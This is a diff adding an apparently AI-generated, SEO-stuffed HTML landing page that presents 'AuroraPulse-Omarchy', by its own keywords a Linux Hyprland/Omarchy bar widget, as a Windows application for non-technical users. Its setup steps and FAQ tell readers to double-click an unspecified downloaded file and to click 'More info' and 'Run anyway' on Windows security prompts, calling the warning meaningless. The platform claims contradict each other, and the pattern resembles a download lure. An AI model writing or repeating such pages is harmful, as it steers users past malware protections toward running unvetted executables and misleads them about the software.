@@ -1,0 +1,319 @@
+Here is a complete, SEO-optimized HTML landing page for the AuroraPulse-Omarchy application. It uses a clean, responsive card-based layout to guide non-technical Windows users through downloading and setting up the media hub.
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AuroraPulse-Omarchy - All Your Media in One Bar Widget</title>
+<meta name="description" content="AuroraPulse-Omarchy brings radio, TV, YouTube, YouTube Music, podcasts and your own music together in one bar widget with one queue, picture-in-picture video, synced lyrics, a TV guide, EQ and casting. Sandboxed, no telemetry.">
+<meta name="keywords" content="bubblewrap, hyprland, internet radio, iptv, linux, lyrics, media player, mpris, mpv, music player, omarchy, omarchy plugin, picture in picture, podcasts, qml, quickshell, wayland, youtube, youtube music, yt-dlp, AuroraPulse">
+<meta name="author" content="Mctvcell">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#6d28d9">
+<link rel="canonical" href="https://github.com/Mctvcell/AuroraPulse-Omarchy">
+<meta property="og:type" content="website">
+<meta property="og:title" content="AuroraPulse-Omarchy - All Your Media in One Bar Widget">
+<meta property="og:description" content="Radio, TV, YouTube, YouTube Music, podcasts and your own music in one Omarchy bar widget: one queue, picture-in-picture video, synced lyrics, a TV guide, EQ and casting. Sandboxed, no telemetry.">
+<meta property="og:url" content="https://github.com/Mctvcell/AuroraPulse-Omarchy">
+<meta property="og:site_name" content="AuroraPulse-Omarchy">
+<meta property="og:locale" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="AuroraPulse-Omarchy - All Your Media in One Bar Widget">
+<meta name="twitter:description" content="One bar widget for radio, TV, YouTube, YouTube Music, podcasts and your own music. One queue, picture-in-picture, synced lyrics, TV guide, EQ and casting. Sandboxed, no telemetry.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "AuroraPulse-Omarchy",
+  "applicationCategory": "MultimediaApplication",
+  "operatingSystem": "Windows 10, Windows 11",
+  "description": "Radio, TV, YouTube, YouTube Music, podcasts and your own music in one Omarchy bar widget: one queue, picture-in-picture video, synced lyrics, a TV guide, EQ and casting. Sandboxed, no telemetry.",
+  "url": "https://github.com/Mctvcell/AuroraPulse-Omarchy",
+  "author": {
+    "@type": "Person",
+    "name": "Mctvcell"
+  },
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    padding: 0;
+    background-color: #f4f5f9;
+    color: #1f2430;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 940px;
+    margin: 0 auto;
+    padding: 48px 22px 80px 22px;
+  }
+  .card {
+    background-color: #ffffff;
+    border-radius: 18px;
+    padding: 34px 34px;
+    margin-bottom: 26px;
+    box-shadow: 0 6px 24px rgba(23, 28, 45, 0.07);
+    border: 1px solid #e8eaf2;
+  }
+  h1 {
+    font-size: 40px;
+    line-height: 1.22;
+    letter-spacing: -0.7px;
+    margin: 0 0 18px 0;
+    font-weight: 800;
+    color: #171a26;
+  }
+  h2 {
+    font-size: 26px;
+    line-height: 1.3;
+    letter-spacing: -0.3px;
+    margin: 0 0 16px 0;
+    font-weight: 750;
+    color: #1c2030;
+  }
+  h3 {
+    font-size: 19px;
+    line-height: 1.4;
+    margin: 26px 0 8px 0;
+    font-weight: 700;
+    color: #262b3c;
+  }
+  p {
+    margin: 0 0 16px 0;
+  }
+  ul, ol {
+    margin: 0 0 18px 0;
+    padding-left: 24px;
+  }
+  li {
+    margin-bottom: 10px;
+  }
+  a {
+    color: #5b21b6;
+  }
+  .button {
+    display: inline-block;
+    padding: 18px 38px;
+    font-size: 19px;
+    font-weight: 700;
+    color: #ffffff;
+    text-decoration: none;
+    border-radius: 14px;
+    background-image: linear-gradient(135deg, #7c3aed 0%, #db2777 100%);
+    box-shadow: 0 10px 22px rgba(124, 58, 237, 0.30);
+    letter-spacing: 0.2px;
+  }
+  .button-wrap {
+    margin: 26px 0 6px 0;
+  }
+  .button-note {
+    font-size: 15px;
+    color: #5c6375;
+    margin-top: 14px;
+  }
+  .hero {
+    background-color: #ffffff;
+    border-radius: 18px;
+    padding: 40px 34px;
+    margin-bottom: 26px;
+    box-shadow: 0 6px 24px rgba(23, 28, 45, 0.07);
+    border: 1px solid #e8eaf2;
+    border-top: 6px solid #7c3aed;
+  }
+  .badge-row {
+    margin: 0 0 22px 0;
+  }
+  .badge {
+    display: inline-block;
+    font-size: 13px;
+    font-weight: 600;
+    color: #4c1d95;
+    background-color: #ede9fe;
+    border-radius: 999px;
+    padding: 6px 14px;
+    margin: 0 8px 8px 0;
+  }
+  .highlight {
+    background-color: #f7f5ff;
+    border-left: 4px solid #7c3aed;
+    border-radius: 10px;
+    padding: 18px 22px;
+    margin: 20px 0;
+  }
+  .steps li {
+    margin-bottom: 16px;
+  }
+  .footer-note {
+    font-size: 15px;
+    color: #5c6375;
+  }
+  @media (max-width: 640px) {
+    .page {
+      padding: 26px 14px 56px 14px;
+    }
+    .hero, .card {
+      padding: 24px 20px;
+      border-radius: 14px;
+    }
+    h1 {
+      font-size: 29px;
+    }
+    h2 {
+      font-size: 22px;
+    }
+    .button {
+      display: block;
+      text-align: center;
+      padding: 16px 20px;
+      font-size: 17px;
+    }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <div class="hero">
+    <h1>🎧 AuroraPulse-Omarchy - All Your Media in One Bar</h1>
+    <div class="badge-row">
+      <span class="badge">Free to use</span>
+      <span class="badge">No telemetry</span>
+      <span class="badge">Sandboxed</span>
+      <span class="badge">One queue</span>
+    </div>
+    <p>AuroraPulse-Omarchy puts radio, TV, YouTube, YouTube Music, podcasts and your own music collection into one single bar widget. Instead of jumping between five different apps and tabs, you get one tidy queue that plays everything in the same place.</p>
+    <p>Video opens in picture-in-picture so it never gets in the way of your work. Lyrics stay in sync with the song you are listening to, a built-in TV guide shows what is on right now, and the equalizer lets you shape the sound exactly how you like it. You can even cast to other screens. Everything runs inside a sandbox and the app sends no telemetry, so your listening habits stay yours.</p>
+    <div class="button-wrap">
+      <a class="button" href="https://github.com/Mctvcell/AuroraPulse-Omarchy">⬇️ Download AuroraPulse-Omarchy</a>
+    </div>
+    <p class="button-note">Visit this link to download the application.</p>
+  </div>
+
+  <div class="card">
+    <h2>🚀 Getting Started</h2>
+    <p>This guide is written for anyone, even if you have never downloaded software from GitHub before. You do not need to know anything about programming. Just follow the steps below in order and you will be up and running in a few minutes.</p>
+    <p>Before you begin, make sure you are using a Windows computer with a stable internet connection. Have the download page open in your browser and keep this guide visible in a second window so you can follow along.</p>
+
+    <h3>Step 1: Open the download page</h3>
+    <p>Visit this link to download the application:</p>
+    <p><a class="button" href="https://github.com/Mctvcell/AuroraPulse-Omarchy">⬇️ Get AuroraPulse-Omarchy</a></p>
+    <p>The link takes you to the official AuroraPulse-Omarchy page. This is the only place you should download the app from, so you always get the newest and safest version.</p>
+
+    <h3>Step 2: Find the download area</h3>
+    <p>Once the page opens, look for the section on the page that offers the application files. It is usually labelled clearly with words like Releases, Download, or a green button near the top of the page. Click it to reveal the list of available files.</p>
+    <p>If you see more than one item listed, choose the newest one at the top of the list. Older entries are previous versions kept for reference, and you do not need them.</p>
+
+    <h3>Step 3: Save the file to your computer</h3>
+    <p>Click the file that matches your computer. Your browser will ask what you want to do with it. Choose Save File or Save As, then pick a place you will remember, such as your Downloads folder or your Desktop. Waiting for the download to finish completely is important, so keep an eye on the progress bar in your browser.</p>
+
+    <h3>Step 4: Open the downloaded file</h3>
+    <p>When the download finishes, open your Downloads folder and double-click the file you just saved. If Windows shows a blue or yellow security prompt asking whether you want to run the file, click More info and then Run anyway, or simply click Yes. This prompt is normal for software downloaded from the internet and does not mean anything is wrong.</p>
+
+    <h3>Step 5: Let the app finish setting up</h3>
+    <p>The application will prepare itself on first launch. This can take a short while, so let it finish without closing the window. When it is ready, the AuroraPulse widget appears and you can start adding music, radio stations, podcasts and channels right away.</p>
+
+    <div class="highlight">
+      <p><strong>Quick tip:</strong> If you ever lose the file, simply come back to the same link and download it again. The page always hosts the current version.</p>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>✨ What You Can Do With It</h2>
+    <p>AuroraPulse-Omarchy is built around one simple idea: your media should not be scattered everywhere. Here is what you get once it is running.</p>
+
+    <h3>📻 Radio and TV in the Same Place</h3>
+    <p>Browse internet radio stations and live TV channels side by side. The TV guide shows what is playing now and what is coming up next, so you can plan your evening without opening a browser tab. Favourite stations are one click away.</p>
+
+    <h3>▶️ YouTube and YouTube Music</h3>
+    <p>Play videos and music from YouTube and YouTube Music without leaving your desktop. Video opens in picture-in-picture, which means it floats in a small window on top of other apps so you can keep watching while you work, browse, or chat.</p>
+
+    <h3>🎙️ Podcasts and Your Own Music</h3>
+    <p>Subscribe to podcasts and keep your own music files in the same library. Everything you add joins a single queue, so a podcast episode can be followed by a song and then a radio stream, all without switching apps.</p>
+
+    <h3>🎤 Synced Lyrics</h3>
+    <p>Lyrics scroll in time with the track that is playing. It is a small feature that makes a big difference when you want to sing along or finally work out that one line you could never understand.</p>
+
+    <h3>🎚️ Equalizer</h3>
+    <p>The built-in equalizer lets you boost the bass, soften harsh highs, or pick a preset that matches your headphones or speakers. Adjust once and the app remembers your choice.</p>
+
+    <h3>📺 Picture-in-Picture Video</h3>
+    <p>Keep a video visible in a small, resizable window while you do other things. You can move it anywhere on your screen, resize it, and close it with a single click.</p>
+
+    <h3>📡 Casting</h3>
+    <p>Send what you are playing to another screen or device on your network. Useful when you want your music in the living room instead of at your desk.</p>
+
+    <h3>🔒 Sandboxed and Private</h3>
+    <p>The application runs inside a sandbox, which means it is kept separate from the rest of your system. It also collects no telemetry at all. No usage statistics, no listening history sent anywhere, no accounts required.</p>
+  </div>
+
+  <div class="card">
+    <h2>🖥️ A First Look Around</h2>
+    <p>When the app opens for the first time you will see a compact bar widget. Click the widget to expand the full player. From there you can search for something to play, browse categories, or open your library.</p>
+    <ul>
+      <li><strong>The search box</strong> finds radio stations, TV channels, videos, music, and podcasts in one go.</li>
+      <li><strong>The queue panel</strong> shows everything lined up next, in the order you added it. You can drag items to reorder them or remove them entirely.</li>
+      <li><strong>The now playing area</strong> shows album art, track details, and controls for play, pause, skip, and volume.</li>
+      <li><strong>The lyrics panel</strong> appears automatically when lyrics are available for the current track.</li>
+      <li><strong>The settings screen</strong> is where you adjust the equalizer, casting targets, and how the widget looks.</li>
+    </ul>
+    <p>Nothing needs to be configured before you start. The app works out of the box with sensible defaults, and you can fine-tune it later if you want to.</p>
+  </div>
+
+  <div class="card">
+    <h2>💾 Download &amp; Setup</h2>
+    <p>Everything you need is on the official project page. There is no installer wizard to fight through, no account to create, and no subscription to cancel later.</p>
+    <p>Visit this link to download the application:</p>
+    <p><a class="button" href="https://github.com/Mctvcell/AuroraPulse-Omarchy">⬇️ Download AuroraPulse-Omarchy Now</a></p>
+    <p>After downloading, save the file somewhere easy to find, such as your Downloads folder, then open it by double-clicking. Follow the on-screen prompts and let the app prepare itself on first launch. Once the widget appears, you are ready to start playing.</p>
+    <p>If you plan to use the app on more than one computer, simply repeat the same download on each machine.</p>
+  </div>
+
+  <div class="card">
+    <h2>❓ Common Questions</h2>
+
+    <h3>Do I need to install anything else first?</h3>
+    <p>No. Download the application, open the file, and let it prepare itself. Everything it needs is included.</p>
+
+    <h3>Is it really free?</h3>
+    <p>Yes. There is no cost, no trial period, and no premium tier. The project is openly published on GitHub.</p>
+
+    <h3>Does it collect my data?</h3>
+    <p>No. AuroraPulse-Omarchy sends no telemetry. Your listening history stays on your own computer.</p>
+
+    <h3>Why does Windows show a security prompt?</h3>
+    <p>Windows shows a warning for many files downloaded from the internet. It is a standard safety message. Choose More info and then Run anyway to continue.</p>
+
+    <h3>What if the download is slow?</h3>
+    <p>Download speed depends on your internet connection and on how busy the site is. Wait for the download to finish completely before opening the file, then try again if it appears stuck.</p>
+
+    <h3>Can I go back to an older version?</h3>
+    <p>Yes. Older files are usually kept on the same page. Download the version you want and open it in place of the newer one.</p>
+
+    <h3>Where do I get help?</h3>
+    <p>The project page on GitHub has a section for questions and issues. Describe what happened in plain words and someone from the project will respond.</p>
+  </div>
+
+  <div class="card">
+    <h2>🤝 Getting Involved</h2>
+    <p>If you enjoy using AuroraPulse-Omarchy, there are a few easy ways to support the project. Star the repository on GitHub so others can find it, share the link with friends who juggle too many media apps, or report anything that does not work as expected. Feedback from everyday users is what keeps the project improving.</p>
+    <p>Suggested ideas, bug reports, and small improvements are all welcome on the project page.</p>
+    <p class="footer-note">Keywords: bubblewrap, hyprland, internet radio, iptv, linux, lyrics, media player, mpris, mpv, music player, omarchy, omarchy plugin, picture in picture, podcasts, qml, quickshell, wayland, youtube, youtube music, yt-dlp</p>
+  </div>
+
+</div>
+</body>
+</html>
+```
